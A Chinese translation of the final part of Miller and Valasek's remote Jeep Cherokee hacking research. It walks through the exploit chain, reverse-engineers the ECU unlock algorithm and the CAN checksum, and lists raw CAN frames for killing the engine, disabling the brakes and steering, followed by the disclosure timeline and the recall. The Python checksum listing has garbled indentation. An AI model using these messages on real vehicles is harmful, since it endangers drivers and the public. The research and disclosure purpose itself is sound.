@@ -1,0 +1,97 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">远程入侵原装乘用车（下）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">唐朝实验室</a> <span class="bull">·</span> <time title="2015/11/30 17:05" ui-time="" datetime="2015/11/30 17:05" class="published ng-binding ng-isolate-scope">2015/11/30 17:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>Author: Dr. Charlie Miller (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8fece2e6e3e3eafdcfe0ffeae1fdeceaa1e0fde8">[email&#160;protected]</a>) Chris Valasek (<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4b283d2a272a382e200b2c262a222765282426">[email&#160;protected]</a>)</strong></p><p><strong>唐朝实验室翻译组:朱于涛 刘家志</strong></p><h1>0x01 完整的利用链</h1><hr><p>至此，我们已经讨论了很多方面来说明如何远程漏洞利用这辆吉普和类似的车型。目前为止，这些信息已经足够你实现完整的漏洞利用，但是我们想要总结一下漏洞链是如何自始至终发挥作用的。</p><h2>识别目标</h2><p>你需要车辆的IP地址。你可以随便选择一个或写一个蠕虫来入侵所有的车辆。如果你知道汽车的VIN或GPS，你可以根据你所了解的车辆停留位置来扫描其IP范围，直到发现对应的VIN或GPS。由于Sprint网络上设备速度很慢，所以这种方法是可行的，你可能需要很多台设备来执行并行扫描，最多可能需要几百台。</p><h2>利用头单元中的OMAP芯片</h2><p>一旦你获得了漏洞车辆的IP地址，你就可以使用合适的D-Bus服务执行方法来运行代码。最简单的就是上传一个SSH公钥和配置文件，然后启动SSH服务。此时，你就可以SSH到目标车辆并从远程终端上运行命令。</p><h2>控制Uconnect系统</h2><p>如果你只想控制无线电广播、HVAC、获取GPS信息或者其他不涉及CAN的攻击，你只需要使用上文中提到的LUA脚本。事实上，使用D-Bus，而不需要执行代码就可以实现大部分的功能，只是要通过使用我们提供的D-Bus服务。如果你想控制汽车的其他方面，继续往下看...</p><h2>在V850中刷入篡改过的固件</h2><p>准备好一个篡改过的V850固件，按照前文中提到的要求就可以轻易地把修改后的固件刷入V850。这个过程需要自动重启系统，可能会向驱动报警，提示有操作在进行。如果这一步你搞糟了，头单元就会变砖，需要替换。</p><h2>通过网络执行物理操作</h2><p>利用篡改过的固件，发送适当的CAN信息，从而操作车辆，这是使用SPI，通过OMAP芯片向V850芯片上修改过的固件发送信息实现的。这一过程需要用到2013年文章中类似的研究知识。</p><h2>通过网络了解汽车内部的物理构造</h2><p>现在，在远程攻击后，我们要开始发送CAN信息。为了弄明白要发送哪些CAN信息，我们需要搞清楚吉普切诺发送的信息有哪些独有的特性。这一过程需要不断地尝试和犯错，逆向机械工具，逆向ECU固件。接下来的这一章节，我们就要完成这些工作。</p><h2>机械工具</h2><p>和所有的安全研究一样，要想事半功倍，合适的工具很重要。不出意外，我们需要机械工具来处理这辆吉普车。这些机械工具可以在低层级上通过CAN与ECU交互。在这些工具中包含有攻击者可能感兴趣的安全访问秘钥和诊断测试功能。</p><p>不过，我们发现这些设备并不是具有软件功能的J2534 标准直通式设备，而是wiTECH生成的专用 软件/硬件系统，价格超过了6700.00美元（约合人民币42513.51元，超过了Tech Authority一年1800美元的订阅费用）。</p><p><img alt="" img-src="vznsp6ujqvj0gsspvdws-g?s=2sdkadyvrlzm"></p><p>图-wiTECH报价</p><p>虽然，某些研究可以在不是用诊断设备的情况下进行，但是很多主动测试和ECU解锁都需要分析这些机械工具。我们卖血卖了几周后，最终购买到了诊断这台吉普切诺（以及其他菲亚特-克莱斯勒车型）所需要的系统。</p><h2>综述</h2><p>wiTECH工具非常易用，可能是经过了重新设计。你可以观察汽车的各个方面，甚至是用图形来表示这台吉普的网络架构，这些在我们使用wiTECH设备以前是无法发现的。</p><p><img alt="" img-src="co7_t943cwckfe9p_06rgg?s=2sdkadyvrlzm"></p><p>图-WiTech软件中显示的2014年款吉普切诺示意图</p><p>wiTECH与其他我们以前见过的诊断程序还有另外一项差别，wiTECH系统是用Java写的，而不是C/C++。这样的话，逆向工程就更容易了，因为其友好的名称，并且能够把字节代码反编译成Java源。</p><p><img alt="" img-src="5j2uvw22g3qkwb667lo1bg?s=2sdkadyvrlzm"></p><p>图-wiTECH的重要文件</p><p>制造商预置的一项方法给反编译造成了困难，就是使用了字符串混淆，似乎是用Allatori混淆器生成的。如下，在java代码中搜索输出字符串并没有得到什么好结果，因为这些代码都是 “加密的”，并且只能在运行时 “解密”。</p><p><img alt="" img-src="actqmhfqtf1crf_c_h4vva?s=2sdkadyvrlzm"></p><p>图-wiTECH的字符串混淆</p><p>我们在一开始分析一些java字节代码时发现，最简单的方法就是把需要的wiTECH JARs导入到一个java应用中，并使用库中的函数来解密。下面就是我们解密的字符串和打印的结果，正好是 “flash engine is invalidated”（flash引擎失效）。</p><p><img alt="" img-src="vt8d4tt1gqtxfe25cmfsjq?s=2sdkadyvrlzm"></p><p>图-Eclipse输出的去混淆文本</p><h2>安全访问</h2><p>虽然，wiTECH设备是用来收集主动测试，比如，用于启动雨刷器的CAN信息，但是最具吸引力的还是通过分析软件来搞明白其安全访问算法，用于 “解锁”一个ECU来进行再编程或其他权限操作。</p><p>再说一次，不同于我们以前研究过的任何诊断软件，wiTECH软件中似乎没有包含任何实际的代码会负责根据用于解锁ECU的种子来生成秘钥。最后，在‘jcanflash/Chrysler/dcx/securityunlock/’ 下的文件中，我们发现某些解锁函数被调用了，调用取决于要重刷的ECU类型。</p><p>在静态分析的最后，我们从中发现了一些代码‘/ngst/com/dcx/NGST/vehicle/services/security/SecurityUnlockManagerImp.java’ ，下面的代码就是来自这个位置：</p><pre><code>localObject = new ScriptedSecurityAlgorithm(new
+EncryptedSecurityU(((ScriptedSecurityMetaData)paramSecurityLevelMetaData
+.getScript()));
+</code></pre><p>不过，我们在检查了‘EncryptedSecurityUnlock’ 之后，并没有发现更多关于秘钥生成算法的信息。</p><p><img alt="" img-src="nk3lmiw_kyawp0dndtbova?s=2sdkadyvrlzm"></p><p>图-加密安全解锁java代码</p><p>通过跟踪安全解锁使用的方法，我们找到了位于‘<code>\jcanflash\com\dcx\NGST\jCanFlash\flashfile\odx\data\scripts\unlock</code>’ 中的一个目录，在这里有很多以‘.esu’ 结尾的文件（后来我们才知道.esu代表的是加密安全解锁）。当我们在十六进制编辑器中检查这些文件时，并没有发现任何可读的字符串或内容，对此我们并不惊讶。</p><p><img alt="" img-src="mzhkt0kly76mv8lhshdimw?s=2sdkadyvrlzm"></p><p>图-wiTECH的加密安全解锁文件</p><p>虽然我们没有解锁算法，但是我们却很清楚整个运作过程是什么样的。wiTECH应用会请求ECU来获取种子，在获得种子后，应用会判断ECU的类型，并解密解锁文件，我们认为秘钥的生成算法就在这个解锁文件中。</p><p>我们再次检查了“EncryptedSecurityUnlock”构造函数，并发现了下面的信息：</p><pre><code>UC localUC = new UC();
+SecurityUnlockFactoryImp localSecurityUnlockFactoryImp =
+      new  SecurityUnlockFactoryImp();
+try
+{
+  byte[] arrayOfByte = localUC.d(a);
+</code></pre><p>传递到‘d’函数的字节流和上面的加密数据非常类似，我们去混淆了这个构造函数，得到了满意的结果。你可以看到他们非常精通l33t语言，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6386f8c387dbd98bc4c08af7e284c4fb8af1c687dfdf87daed85fbcc81e3ff24500d501123170a530d81e3fe80e3e186f3f2140a3726202b8be7d286dbde8be4d784">[email&#160;protected]</a>。</p><pre><code>Uc.init(<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a042203ce793ce93d2e0d4c990ce42203d">[email&#160;protected]</a>, “MD5”, “”, “BC”, “AES”, new String[] 
+{“com.chrysler.lx.UnlockCryptographerTest”, 
+"com.dcx.securityunlock.encrypted.EncryptedSecurityUnlock", “”, 
+“com.dcx.NGST.jCanFlash.flashfile.efd2.SecurityUnlockBuilderImpTest”});
+</code></pre><p>在运行了“00A6.esu” （如上）上的解密例程后，现在我们能看到这确实是一个用于根据种子生成秘钥的JavaScript。</p><p><img alt="" img-src="tycuntxhoawzqtk4io7xiw?s=2sdkadyvrlzm"></p><p>图-解密后的javascript解锁文件</p><p>在解密了用于解锁ECU的文件后，我们就能够看到javascript脚本了，并可以把脚本的功能移植到Python。不出意外的话，这个算法中还涉及到了一些秘密和简单的位元操作，因为在自动化行业中，这些技术几乎无处不在。在下面的截图中，是我们用来解锁吉普切诺中各种ECU的Python代码，但是很多其他的车型可能也应用了相同的算法。完整的代码可以在’JeepUnlock.py’的内容数据包中找到。</p><p><img alt="" img-src="3kp7ytcewgdd3lnucee4yq?s=2sdkadyvrlzm"></p><p>图-吉普切诺的ECU解锁算法</p><p>应该注意，与我们之前研究的福特和丰田车不同，我们实际上不需要安全访问秘钥就可以执行攻击。安全访问算法的唯一作用就是用来重刷ECU，而我们并没有对此进行探索。</p><h2>PAM ECU逆向</h2><p>通过利用机械工具，我们能够执行主动测试，并嗅探测试结果。另外，我们还知道了安全算法和秘钥，允许我们执行权限操作。但是，机械工具发送的信息是固定的，也没有使用校验和。我们检查发现ECU之间的流量经常会使用校验和。如果，我们想要自己制作CAN信息（不是简单的回复现有的信息），我们需要理解这些校验和。为此，我们必须观察执行校验和的代码，而这些代码只会出现在ECU本身中。</p><p>很多时候，通过观察嗅探得到的CAN流量就足够判断车速、刹车比率和其他的情况。另外，这些CAN信息中最后的数据字节就是校验和。例如，下面的信息就来自一款2010年的丰田普锐斯，这款车就使用了车道维持辅助系统（LKA）。</p><pre><code>IDH: 02, IDL: E4, Len: 05, Data: 98 00 00 00 83
+IDH: 02, IDL: E4, Len: 05, Data: 9A 00 00 00 85
+IDH: 02, IDL: E4, Len: 05, Data: 9E 00 00 00 89
+</code></pre><p>在每条信息中，最后的字节是CAN ID、数据长度和数据字节的一个整数加法校验和（限制为1字节），通过分析几条信息就能想到这一点。我们发现大多数信息不是纵向冗余检查（异或校验和）就是整数加法校验和，但是泊车辅助模块（PAM）使用的校验和与我们之前看到的都不一样。下面的信息就是2014款吉普切诺的PAM模块发送的。</p><pre><code>IDH: 02, IDL: 0C, Len: 04, Data: 80 00 06 7F
+IDH: 02, IDL: 0C, Len: 04, Data: 80 00 08 D9
+IDH: 02, IDL: 0C, Len: 04, Data: 80 00 19 09
+</code></pre><p>PAM信息使用的校验和算法不仅与我们知道的不同，而且也不同于库普曼在论文中介绍的校验和技术和CRC数据完整性技术。我们认为，如果我们能获取到固件并逆向其代码，我们就能识别出校验和算法，这样我们就可以制作任意的信息，让监听CAN总线的ECU认为信息是有效的。</p><p>很幸运，wiTECH软件为我们提供了所有必要的信息来网购一个PAM模块，序列号：56038998AJ；我们可以从任何销售MOPAR部件的销售商那里下单。</p><p><img alt="" img-src="cwxnf7at2lx6bet1v7pvug?s=2sdkadyvrlzm"></p><p>图-2014年吉普车的泊车辅助模块</p><p>wiTECH工具还能够更新PAM，也提示我们固件可以从网上下载并本地储存到计算机上来执行更新。这点很明确，在调查了运行wiTECH笔记本上的文件系统，我们找到了目录：‘%PROGRAMDATA%\wiTECH\jserver\userData\file\flashfiles’。这个目录下包含着固件缓存，这样软件就不需要在每次刷新事件时，重新下载副本。</p><p>我们还不确定哪个文件是哪个，这些文件是如何编码的，所以在重刷两个ECU的过程中，我们捕捉了CAN流量。再对比在文件重刷过程中的数据，我们可以推断出其中一个文件就是泊车辅助模块的更新。我们在文件5603899ah.efd上运行了字符串来查找 “PAM”字符串，结果表明，这个固件更新就是我们要获取的固件。</p><pre><code>C:\Jeep\pam&gt;strings 56038998ah.efd | grep PAM
+PAM
+PAM_CUSW SU 
+.\PAM_DSW\GEN\DSW09_PROJECT_gen\api\DTC_Mapping_MID_DTCID_PROJECT.h 
+.\PAM_DSW\GEN\DSW09_PROJECT_gen\api\DTC_Mapping_MID_DTCID_PROJECT.h 
+.\PAM_DSW\DSW_Adapter\src\DSW4BSW_PDM2NVM.c
+</code></pre><p>注意：你会注意到我们还没有聪明到能根据EFD文件的名称，也就是2014年吉普切诺泊车辅助模块的序列号，来推断出路径是不是正确的。</p><p>这个文件本身并不只是一个固件镜像，而是包含了wiTECH软件使用的元数据，其目的并不单一。幸运的是，我们可以通过wiTECH软件中提供的JAR文件来实现特定的方法调用，从而发现真正的字符串偏移和固件的大小。</p><p>在导入了合适的类后，下面的调用链会披露真正的起始偏移和固件大小。</p><pre><code>String user_file = "C:/Jeep/pam/56038998ah.efd"; 
+UserFileImp ufi = new UserFileImp(user_file); ff.load(ufi);    
+
+Microprocessor mps[] = ff.getMicroprocessors(); 
+StandardMicroprocessor smp = (StandardMicroprocessor)mps[0];    
+
+LogicalBlock lb = smp.getLogicalBlocks()[0];    
+
+PhysicalBlockImp pb = (PhysicalBlockImp)lb.getPhysicalBlocks()[0];    
+
+System.out.println("Block Len: " + pb.getBlockLength()); 
+System.out.println("Block len (uncomp): " + pb.getUncompressedBlockLength()); 
+System.out.println("File Offset: " + pb.getFileOffset()); 
+System.out.println("Start Address: " + pb.getStartAddress());
+</code></pre><p>上面的输出代码如下：</p><pre><code>Block Len: 733184
+Block len (uncomp): 733184
+File Offset: 3363
+Start Address: 8192
+</code></pre><p>现在，我们已经掌握了所有需要的信息来写一个Python脚本，提取固件并开始逆向。</p><p>还遗留下的一个主要问题是，我们仍然无法完全确定PAM模块中使用的CPU是什么架构的。最佳的行动方案就是打开PAM模块，通过观察主板上的标志来判断。如果我们能确定芯片标志，那么很可能我们就能够判断出使用的是哪个处理器，并在IDA Pro中开始反汇编固件。</p><p><img alt="" img-src="x_zqzh4abxxvhngmja2a9a?s=2sdkadyvrlzm"></p><p>图-PAM PCB</p><p>虽然不容易发现，主要MCU上的标志是D70F3634，我们通过谷歌搜到这是Renesas v850芯片。很幸运，信息娱乐系统上使用的也是这个芯片，所以先前的逆向脚本，技术和工具都可以再用。</p><p>现在，我们已经从更新中提取出了固件，并知道了其架构，我们可以通过逆向这个二进制，找到用于计算校验和的函数。在经过了一些讨论后，我们认为其中的一个常量可能经过了异或，从而导致校验和虽然有类似的有效载荷但是区别很大。快速地进行搜索后，我们发现了一个函数异或了一些值，并且似乎具有某些循环。这个函数是一个完美的逆向候选。</p><p><img alt="" img-src="ptcxekgucmeyvbjymi_mvq?s=2sdkadyvrlzm"></p><p>我们首先把反汇编语言逆向成了C语言，因为本文的作者之一就是个神经病。这时候，C函数就可以移植到Python进行测试。下面的代码是从反汇编中得到的Python代码。</p><p>图-PAM校验和算法</p><pre><code>#!python
+def calc_checksum(data, length):
+    end_index = length - 1
+    index = 0
+    checksum = 0xFF
+    temp_chk = 0;
+    bit_sum = 0;
+    if(end_index &lt;= index):
+        return False
+    for index in range(0, end_index):
+        shift = 0x80
+        curr = data[index]
+        iterate = 8
+        while(iterate &gt; 0):
+            iterate -= 1
+            bit_sum = curr &amp; shift;
+            temp_chk = checksum &amp; 0x80
+            if (bit_sum != 0):
+                bit_sum = 0x1C
+                if (temp_chk != 0):
+bit_sum = 1
+    checksum = checksum &lt;&lt; 1
+    temp_chk = checksum | 1
+    bit_sum ^= temp_chk
+else:
+    if (temp_chk != 0):
+        bit_sum = 0x1D
+    checksum = checksum &lt;&lt; 1
+    bit_sum ^= checksum
+        checksum = bit_sum
+        shift = shift &gt;&gt; 1
+return ~checksum &amp; 0xFF
+</code></pre><p>如果你通过“calc_checksum”函数运行从上面PAM信息获取的3字节数据。更重要的是，我们在吉普车上看到所有包含了1字节校验和的CAN总线都是使用了相同的函数。所以，我们获取到的校验和算法适用于所有感兴趣的信息。这个校验和与我们前面遇到的那个相比，更加复杂。</p><p>注意：我们还发现了另外两个校验和，并逆向到了C语言，但是任何我们感兴趣的信息都没有使用这两个校验和。这两个算法很类似但是字节长度不同。</p><h2>通过网络来发送CAN信息</h2><p>一旦你能够通过远程漏洞利用来发送CAN信息，那么弄清楚发送哪些信息来影响其物理系统就是小菜一碟了。先前，我们用了整年的时间来弄明白应该向福特和丰田汽车发送哪些信息，所以我们也没有着急也在吉普车上做这样的工作。不过，我们确实也做了少量的一些工作来证明汽车的哪些物理系统是可以通过远程漏洞利用来控制，但是，这并不是我们研究的主要目的。</p><h2>常规的CAN信息</h2><p>正如在先前的研究中讨论过的，这里有两类CAN信息，常规信息和诊断信息。在常规操作时，常规信息总是会在总线中出现。诊断信息一般只会在机械测试、处理ECU时或其他非常规情况中才会出现。我们首先检查了一些仅仅通过常规CAN信息就可以操作的物理特性。</p><h2>转向信号</h2><p>转向信号，也就是转向灯是通过一条CAN信息控制的，这条CAN信息的ID是’04F0’，位于CAN-C网络上。如果第一个字节是01，就是左转向信号；如果是02，就是右转向信号。下面的LUA脚本可以激活转向指示器。</p><p>注意：这个脚本使用了v850的芯片的SPI通讯，所以，CAN ID会移动2个字节来满足硬件需要。</p><pre><code>local clock = os.clock
+function sleep(n)  -- seconds
+  local t0 = clock()
+  while clock() - t0 &lt;= n do end
+end
+ipc = require("ipc")
+file = '/dev/ipc/ch7'
+g = assert(ipc.open(file))
+while true do
+-- can3 can2 can1 can0 data0 g:write(0xf0, 0x02, 91, 0x07, 0x00, 0x00, 0xC0, 0x13, 0x01, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00)  -- left turn
+      sleep(.001)
+end
+</code></pre><h2>车锁</h2><p>锁定信号与转向信号很类似。控制车锁的信息ID是05CE，位于CAN IHS总线上。这个数据有两个字节。如果第二个字节是02，就锁车；如果是04，就开锁。</p><h2>RPMS</h2><p>转速表是通过CAN-C总线上的信息01FC控制的。在先前的两个信息示例中只有数据。而这条信息的形式不同，在吉普车上也不常见。最后的两个字节是一个计数器，会自增每条信息和校验和。在前面我们已经介绍过了这个校验和。下面是这条信息的形式：</p><p>IDH: 01, IDL: FC, Len: 08, Data: 07 47 4C C1 70 00 45 48</p><p>前两个字节就是要显示的RPM。在这个例子中就是0x747，也就是1863 RPM。</p><h2>CAN诊断信息</h2><p>诊断信息要比常规信息更强大，但是，如果车辆正在行驶，一般是超过5-10 mph， 多数ECU就会忽略诊断信息。所以，只有车辆在低速行驶时，这类攻击才可能执行，除非攻击者知道如何伪造一个速度来判断是否接收诊断信息。</p><p>注意：这台吉普车的诊断信息是29位的CAN信息。</p><h2>关闭引擎</h2><p>这条信息是从机械工具发送的一项测试中收集到的。你可以启动一个诊断会话，然后调用’startRoutineByLocalIdentifier’。在这个例子中，本地标识符是15，数据是00 01。这个测试的目的是关闭一个特定的喷油嘴，我们估计是第一个喷油嘴。</p><p>发送的信息必须要像下面的形式一样。首先，启动一个诊断会话。再提一下，只有在低速时，这种攻击才能成功。</p><pre><code>EID: 18DA10F1, Len: 08, Data: 02 10 92 00 00 00 00 00
+</code></pre><p>然后调用例程：</p><pre><code>EID: 18DA10F1, Len: 08, Data: 04 31 15 00 01 00 00 00
+</code></pre><h2>刹车</h2><p>这辆吉普切诺与福特翼虎有着相同的 “功能”，也就是当创建了一个诊断会话时，汽车在行驶过程中就会把刹车踩到底。这样导致的结果就是刹车失灵，造成安全问题，即使这种情况只会发生在低速行驶过程中。</p><p>首先，我们需要使用ABS ECU启动一个诊断会话</p><pre><code>EID: 18DA28F1, Len: 08, Data: 02 10 03 00 00 00 00 00
+</code></pre><p>然后，我们猛踩刹车（把所有的刹车踩到底）。这只是一条信息（InputOutput ），但是需要多个CAN信息，因为数据太长了，无法放到一个单独的CAN框架中。</p><pre><code>EID: 18DA28F1, Len: 08, Data: 10 11 2F 5A BF 03 64 64
+EID: 18DA28F1, Len: 08, Data: 64 64 64 64 64 64 64 64
+EID: 18DA28F1, Len: 08, Data: 64 64 64 00 00 00 00 00
+</code></pre><h2>转向</h2><p>转向（作为泊车协助的一部分）和防碰撞刹车只能由常规的CAN信息操作。但是，不同于我们以前观察到的车辆，仅仅使用CAN信息注入就更难控制了。例如，在丰田普锐斯上，要想刹车，你只需要向网络发送海量的信息，让高速防碰撞系统来启动刹车。当然，真正的防碰撞系统会说不要踩刹车，因为没有必要。丰田的ABS ECU会发现注入信息和真正的信息之间存在冲突，并会根据信息的出现频率来做出行动。所以，让车辆刹车并不难。</p><p>在吉普车上，这类功能却不是这样。我们已经确定了防碰撞系统会使用哪些信息来控制刹车。但是，当我们发送了这个信息时，ECU接收到了我们发出的信息来应用刹车，也接收到了真正的信息说不要刹车，这时吉普上的ABS ECU就会完全关闭防碰撞系统。但是，吉普上这个ECU在设计上就会查找这类异常，并且不会响应。这样，我们在丰田普锐斯上执行的很多操作在吉普上都无法实现。话虽如此，但是还是可以通过伪造信息来控制车辆的关键安全方面。我们并没有在这个方向上投入太多的努力，因为研究重点是远程漏洞利用。</p><p>作为我们就此的一个研究案例，我们会离线发送真正信息的ECU。然后，接收信息的ECU就只能看到我们的信息，所以也就不会出现冲突了。弊端是我们必须要利用诊断信息来离线真正的ECU。这就意味着，即使真正的操作只会涉及到常规的CAN信息，我们也只能在低速时执行这种攻击，因为我们首先需要使用诊断信息。</p><p>我们会以转向为例来证明这一点。在转向时，如果泊车辅助系统接收到了冲突信息，系统就会离线（实际上，方方向盘可能会有轻微的移动，尤其是当车辆在停止前行时，但是为了获取全面的控制，你必须要遵守这个过程）。泊车辅助模块（PAM）是发送真正信息的ECU。所以，我们要让PAM进入诊断会话，防止PAM发送常规信息。然后，我们发送信息让汽车转向。</p><p>首先我们要启动一个涉及PAM的诊断会话：</p><pre><code>EID: 18DAA0F1, Len: 08, Data: 02 10 02 00 00 00 00 00
+</code></pre><p>然后，我们发送CAN信息，告诉动力转向ECU来转向。这些信息应该与下面的类似：</p><pre><code>IDH: 02, IDL: 0C, Len: 04, Data: 90 32 28 1F
+</code></pre><p>这里的前两个字节是应用到转向轮的扭矩。80 00 是没有扭矩。更大的数字，比如C0 000是逆时针转向，而较小的数字，比如 40 00 是顺时针方转动。第三个字节的第一个半字节用于指示是否启用自动停车 (0 = no，2 = yes)。这个字节的第二个半字节是一个计数器。最后一个字节是校验和。</p><h1>0x02 问题和修复</h1><hr><h2>问题披露</h2><p>我们在此披露了一些在菲亚特-克莱斯勒汽车(FCA) 中发现的问题。时间如下：</p><ol><li>2014年10月：我们发现D-Bus服务暴露了，并且存在漏洞。</li><li>2015年3月：我们发现可以再编FCA汽车的V850芯片，从OMAP芯片中发送任意的CAN信息。此时，我们已经通知了他们这些问题，并计划在2015年8月的黑帽大会和DEFCON大会上提出这些发现。</li><li>2015年4月：我们发现不仅仅是Wi-Fi，还可以通过蜂窝网络来访问D-Bus。</li><li>2015年7月：我们提前将此次研究的副本提供给了FCA，哈曼卡顿，NHTSA和QNX。</li><li>2015年7月16日：克莱斯勒公布了解决问题的修复办法。</li><li>2015年7月21日：发布了有线文章。</li><li>2015年7月24日：Sprint蜂窝网络拦截了端口6667上的流量。克莱斯勒自主召回了140万台车辆。</li></ol><h2>修复和应对办法</h2><p>克莱斯勒已经在版本15.26.1中修复了这一问题。我们还没有深入地研究这个修复方案，但是最终结果表明现在汽车已经不会再接收输入的TCP/IP数据包。这是在修复前的nmap扫描结果（版本14.25.5）</p><p>启动Nmap 6.01( <code>http://nmap.org</code> ) 的时间：2015-07-26 11:23 CDT</p><p><img alt="" img-src="un-2r72qkz57f4udxj_cmg?s=2sdkadyvrlzm"></p><p>安装了修复后的nmap扫描结果：</p><p>启动Namp 6.01( <code>http://nmap.org</code> ) 的时间：2015-07-26 11:42 CDT</p><p><img alt="" img-src="hb04civortypryx5xbwobw?s=2sdkadyvrlzm"></p><p>另外，Sprint网络也至少拦截了端口6667上的流量，甚至是来自同一个信号塔的流量。所以，攻击一台存在漏洞，未修复的汽车只能通过Wi-Fi来实现，如果可行的话，通过飞蜂窝连接。这两种攻击方法都需要靠近目标车辆。</p><h1>0x03 总结</h1><hr><p>这篇文章是我们三年以来在汽车安全研究方面的最高成果。在文章中，我们证明了，大量的菲亚特-克莱斯勒汽车都可以被远程攻击。存在漏洞的车辆成千上万，致使FCA不得不召回了140万台汽车，并且修改了Sprint的运营商网络。这种远程攻击可以针对在美国任何地方的车辆，并且不需要攻击者或驾驶员改装车辆的任何地方或物理交互。由于远程攻击的影响，一些物理系统，比如转向和刹车会受到影响。我们提供此次研究的目的就是希望我们在将来能生产更安全的汽车，这样我们才能在开车时保证自己的安全，避免遭受网络攻击。制造商、供应商和安全研究人员可以利用这些信息，继续深入地调查吉普切诺和其他的车型，共同致力于车辆安全。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/9975" rel="bookmark" id="re1">远程入侵原装乘用车（中）</a></li><li><a href="http://drops.wooyun.org/papers/9974" rel="bookmark" id="re2">远程入侵原装乘用车（上）</a></li><li><a href="http://drops.wooyun.org/papers/64" rel="bookmark" id="re3">DNS域传送信息泄露</a></li><li><a href="http://drops.wooyun.org/papers/9893" rel="bookmark" id="re4">浅谈zip格式处理逻辑漏洞</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"></div></div></div></main>
